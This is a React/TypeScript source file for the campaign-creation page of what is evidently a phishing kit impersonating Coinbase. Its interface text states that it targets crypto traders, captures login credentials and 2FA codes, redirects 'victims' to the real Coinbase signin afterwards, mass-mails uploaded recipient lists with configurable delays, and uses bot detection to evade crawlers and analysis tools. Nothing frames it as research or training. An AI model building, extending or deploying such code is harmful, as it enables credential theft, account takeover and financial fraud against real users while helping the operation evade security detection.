import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { insertCampaignSchema } from "@shared/schema";
import { z } from "zod";
import { 
  Plus, 
  Eye, 
  Zap, 
  Send, 
  Upload, 
  Image as ImageIcon,
  FileText,
  CheckCircle,
  Computer,
  Mail
} from "lucide-react";

const campaignFormSchema = insertCampaignSchema.extend({
  notificationEmail: z.string().email().optional().or(z.literal("")),
});

type CampaignFormData = z.infer<typeof campaignFormSchema>;

export default function CreateCampaignPage() {
  const [recipientsFile, setRecipientsFile] = useState<File | null>(null);
  const [imageFiles, setImageFiles] = useState<File[]>([]);
  const { toast } = useToast();
  const queryClient = useQueryClient();

  const form = useForm<CampaignFormData>({
    resolver: zodResolver(campaignFormSchema),
    defaultValues: {
      type: "coinbase",
      delayMs: 2000,
      botDetectionEnabled: true,
      detectionLevel: "medium",
      redirectUrl: "https://www.coinbase.com/signin",
      customPath: "/coinbase",
    },
  });

  const createCampaignMutation = useMutation({
    mutationFn: async (data: CampaignFormData) => {
      const response = await apiRequest("POST", "/api/campaigns", data);
      return response.json();
    },
    onSuccess: (campaign) => {
      toast({
        title: "Success",
        description: "Campaign created successfully!",
      });
      queryClient.invalidateQueries({ queryKey: ["/api/campaigns"] });
      form.reset();
    },
    onError: () => {
      toast({
        title: "Error",
        description: "Failed to create campaign.",
        variant: "destructive",
      });
    },
  });

  const uploadRecipientsMutation = useMutation({
    mutationFn: async ({ campaignId, file }: { campaignId: string; file: File }) => {
      const formData = new FormData();
      formData.append("file", file);
      const response = await fetch(`/api/campaigns/${campaignId}/recipients`, {
        method: "POST",
        body: formData,
        credentials: "include",
      });
      if (!response.ok) throw new Error("Upload failed");
      return response.json();
    },
  });

  const onSubmit = async (data: CampaignFormData) => {
    try {
      const campaign = await createCampaignMutation.mutateAsync({
        ...data,
        type: "coinbase",
      });

      // Upload recipients file if provided
      if (recipientsFile && campaign.id) {
        await uploadRecipientsMutation.mutateAsync({
          campaignId: campaign.id,
          file: recipientsFile,
        });
      }
    } catch (error) {
      console.error("Campaign creation failed:", error);
    }
  };

  // Handle preview campaign
  const handlePreviewCampaign = () => {
    const formData = form.getValues();
    const previewUrl = `/coinbase?customPath=${encodeURIComponent(formData.customPath || '/coinbase')}`;
    
    // Open preview in new tab
    window.open(previewUrl, '_blank');
    
    toast({
      title: "Preview Opened",
      description: "Coinbase campaign preview opened in new tab",
    });
  };

  // Handle test campaign
  const handleTestCampaign = () => {
    const formData = form.getValues();
    
    if (!formData.name) {
      toast({
        title: "Error",
        description: "Please enter a campaign name before testing.",
        variant: "destructive",
      });
      return;
    }

    // In a real implementation, this would send a test email to the user
    toast({
      title: "Test Campaign",
      description: `Test campaign functionality for "${formData.name}" - would send test email to admin`,
    });
  };

  const handleRecipientsFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setRecipientsFile(file);
    }
  };

  const handleImageFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = Array.from(e.target.files || []);
    setImageFiles(prev => [...prev, ...files]);
  };

  return (
    <div className="h-full overflow-y-auto">
      {/* Page Header */}
      <div className="bg-card border-b border-border px-6 py-4">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl font-bold text-foreground">Create Campaign</h1>
        </div>
      </div>

      <div className="p-6 max-w-6xl mx-auto">
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
          {/* Coinbase Campaign Info */}
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center space-x-4 mb-6">
                <div className="w-16 h-16 bg-blue-600/20 rounded-lg flex items-center justify-center">
                  <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white text-lg font-bold">₿</div>
                </div>
                <div>
                  <h3 className="text-xl font-semibold text-foreground">Coinbase Campaign</h3>
                  <p className="text-muted-foreground">Target cryptocurrency users with authentic Coinbase login portal</p>
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 p-4 bg-muted/30 rounded-lg">
                <div>
                  <h4 className="font-medium text-foreground">Platform</h4>
                  <p className="text-sm text-muted-foreground">Coinbase Exchange</p>
                </div>
                <div>
                  <h4 className="font-medium text-foreground">Target</h4>
                  <p className="text-sm text-muted-foreground">Crypto traders & investors</p>
                </div>
                <div>
                  <h4 className="font-medium text-foreground">Captures</h4>
                  <p className="text-sm text-muted-foreground">Login credentials & 2FA</p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Campaign Settings */}
          <Card>
            <CardContent className="p-6">
              <h3 className="text-lg font-semibold text-foreground mb-6">Campaign Settings</h3>
              
              <div className="space-y-6">
                {/* Basic Settings */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <Label htmlFor="name">Campaign Name</Label>
                    <Input
                      id="name"
                      {...form.register("name")}
                      placeholder="Enter campaign name"
                      data-testid="input-campaign-name"
                    />
                  </div>
                  <div>
                    <Label htmlFor="delayMs">Delay Between Emails (ms)</Label>
                    <Input
                      id="delayMs"
                      type="number"
                      {...form.register("delayMs", { valueAsNumber: true })}
                      data-testid="input-delay"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <Label htmlFor="notificationEmail">Notification Email (Optional)</Label>
                    <Input
                      id="notificationEmail"
                      type="email"
                      {...form.register("notificationEmail")}
                      placeholder="admin@yourcompany.com"
                      data-testid="input-notification-email"
                    />
                    <p className="text-xs text-muted-foreground mt-1">Receive campaign completion report</p>
                  </div>
                  <div>
                    <Label htmlFor="domain">Domain</Label>
                    <Input
                      id="domain"
                      {...form.register("domain")}
                      placeholder="example.com"
                      data-testid="input-domain"
                    />
                    <p className="text-xs text-red-400 mt-1">Enter domain name without http:// or www</p>
                  </div>
                </div>

                {/* URLs */}
                <div>
                  <Label htmlFor="redirectUrl">Final Redirect URL</Label>
                  <Input
                    id="redirectUrl"
                    {...form.register("redirectUrl")}
                    data-testid="input-redirect-url"
                  />
                  <p className="text-xs text-muted-foreground mt-1">Victims will be redirected here after credentials are captured</p>
                </div>

                <div>
                  <Label htmlFor="customPath">Custom URL Path (Optional)</Label>
                  <Input
                    id="customPath"
                    {...form.register("customPath")}
                    placeholder="/login"
                    data-testid="input-custom-path"
                  />
                  <p className="text-xs text-muted-foreground mt-1">Customize URL path instead of random slug</p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* File Uploads */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Recipients List */}
            <Card>
              <CardContent className="p-6">
                <h3 className="text-lg font-semibold text-foreground mb-4">Recipients List</h3>
                <div className="border-2 border-dashed border-border rounded-lg p-8 text-center hover:border-primary/50 transition-colors">
                  <div className="w-16 h-16 mx-auto mb-4 bg-muted/30 rounded-lg flex items-center justify-center">
                    <FileText className="w-8 h-8 text-muted-foreground" />
                  </div>
                  <p className="text-foreground mb-1">
                    Drop your .txt file here or{" "}
                    <label className="text-primary cursor-pointer">
                      click to browse
                      <input
                        type="file"
                        accept=".txt"
                        onChange={handleRecipientsFileChange}
                        className="hidden"
                        data-testid="input-recipients-file"
                      />
                    </label>
                  </p>
                  <p className="text-sm text-muted-foreground">One email per line</p>
                  {recipientsFile && (
                    <div className="mt-4 p-2 bg-green-500/10 border border-green-500/20 rounded">
                      <p className="text-sm text-green-400">✓ {recipientsFile.name}</p>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>

            {/* Image Management */}
            <Card>
              <CardContent className="p-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-foreground">Image Management (CIDs)</h3>
                  <Button size="sm" className="bg-green-600 hover:bg-green-700" data-testid="button-upload-image">
                    <Upload className="w-4 h-4 mr-2" />
                    Upload Image
                  </Button>
                </div>
                <div className="border-2 border-dashed border-border rounded-lg p-8 text-center hover:border-primary/50 transition-colors">
                  <div className="w-16 h-16 mx-auto mb-4 bg-muted/30 rounded-lg flex items-center justify-center">
                    <ImageIcon className="w-8 h-8 text-muted-foreground" />
                  </div>
                  <p className="text-foreground mb-1">
                    Drag & drop images here or{" "}
                    <label className="text-primary cursor-pointer">
                      click to browse
                      <input
                        type="file"
                        accept="image/*"
                        multiple
                        onChange={handleImageFileChange}
                        className="hidden"
                        data-testid="input-image-files"
                      />
                    </label>
                  </p>
                  <p className="text-sm text-muted-foreground">Upload images from your campaign</p>
                  {imageFiles.length > 0 && (
                    <div className="mt-4 space-y-2">
                      {imageFiles.map((file, index) => (
                        <div key={index} className="p-2 bg-green-500/10 border border-green-500/20 rounded">
                          <p className="text-sm text-green-400">✓ {file.name}</p>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Bot Detection */}
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center space-x-3">
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="botDetection"
                      checked={form.watch("botDetectionEnabled") ?? false}
                      onCheckedChange={(checked) => form.setValue("botDetectionEnabled", !!checked)}
                      data-testid="checkbox-bot-detection"
                    />
                    <Label htmlFor="botDetection" className="cursor-pointer">Enable Bot Detection</Label>
                  </div>
                  <Badge className="bg-primary/20 text-primary">NEW</Badge>
                </div>
              </div>
              <p className="text-sm text-muted-foreground mb-4">
                Protects against crawlers, bots and analysis tools to avoid being red flagged
              </p>
              
              <div>
                <Label>Detection Level</Label>
                <Select 
                  value={form.watch("detectionLevel") ?? "medium"} 
                  onValueChange={(value) => form.setValue("detectionLevel", value)}
                  data-testid="select-detection-level"
                >
                  <SelectTrigger className="w-full md:w-64">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="low">Low (Basic protection)</SelectItem>
                    <SelectItem value="medium">Medium (Recommended)</SelectItem>
                    <SelectItem value="high">High (Strict filtering)</SelectItem>
                    <SelectItem value="custom">Custom</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </CardContent>
          </Card>

          {/* Campaign Actions */}
          <Card>
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <Button 
                  type="button" 
                  variant="secondary" 
                  onClick={handlePreviewCampaign}
                  data-testid="button-preview"
                >
                  <Eye className="w-4 h-4 mr-2" />
                  Preview Campaign
                </Button>
                
                <div className="flex items-center space-x-3">
                  <Button 
                    type="button" 
                    className="bg-orange-600 hover:bg-orange-700" 
                    onClick={handleTestCampaign}
                    data-testid="button-test"
                  >
                    <Zap className="w-4 h-4 mr-2" />
                    Test Campaign
                  </Button>
                  <Button 
                    type="submit" 
                    disabled={createCampaignMutation.isPending}
                    data-testid="button-start-campaign"
                  >
                    <Send className="w-4 h-4 mr-2" />
                    {createCampaignMutation.isPending ? "Creating..." : "Start Mass Campaign"}
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </form>
      </div>
    </div>
  );
}
